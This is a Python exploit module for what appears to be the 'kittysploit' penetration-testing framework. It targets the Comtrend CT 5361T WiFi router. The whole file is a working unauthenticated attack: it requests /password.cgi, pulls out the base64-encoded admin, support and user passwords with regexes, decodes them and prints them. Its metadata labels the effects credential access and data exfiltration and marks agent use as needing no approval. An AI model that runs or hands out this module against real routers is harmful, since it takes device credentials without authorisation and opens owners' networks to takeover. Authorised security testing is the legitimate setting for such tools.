#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Comtrend CT 5361T Password Disclosure"""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client



class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'Comtrend CT 5361T Password Disclosure',
        'description': 'WiFi router Comtrend CT 5361T suffers from a Password Disclosure Vulnerability',
        'author': ['TUNISIAN CYBER'],
        
        'platform': Platform.LINUX,
        'references': ['https://packetstormsecurity.com/files/126129/Comtrend-CT-5361T-Password-Disclosure.html'],
        'tags': ['iot', 'router', 'disclosure', 'credentials', 'unauth', 'auxiliary'],
        'agent': {
            'risk': 'active',
            'effects': ['credential_access', 'data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['credentials', 'risk_signals'],
        },
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        if self.check():
            response = self.http_request(
                method="GET",
                path="/password.cgi",
            )
            if response is None:
                return

            regexps = [
                ("admin", "pwdAdmin = '(.+?)'"),
                ("support", "pwdSupport = '(.+?)'"),
                ("user", "pwdUser = '(.+?)'")
            ]

            creds = []
            for regexp in regexps:
                res = re.findall(regexp[1], response.text)

                if res:
                    value = str(b64decode(res[0]), "utf-8")
                    creds.append((regexp[0], value))

            if len(creds):
                print_success("Credentials found!")
                headers = ("Login", "Password")
                print_table(headers, *creds)
                print_info("NOTE: Admin is commonly implemented as root")
            else:
                print_error("Credentials could not be found")
        else:
            print_error("Device seems to be not vulnerable")
    def check(self):
        response = self.http_request(
            method="GET",
            path="/password.cgi",
        )

        if response is None:
            return False  # target is not vulnerable

        regexps = ["pwdAdmin = '(.+?)'",
                   "pwdSupport = '(.+?)'",
                   "pwdUser = '(.+?)'"]

        for regexp in regexps:
            res = re.findall(regexp, response.text)

            if len(res):
                try:
                    b64decode(res[0])  # checking if data is base64 encoded
                except Exception:
                    return False  # target is not vulnerable
            else:
                return False  # target is not vulnerable

        return True  # target is vulnerable
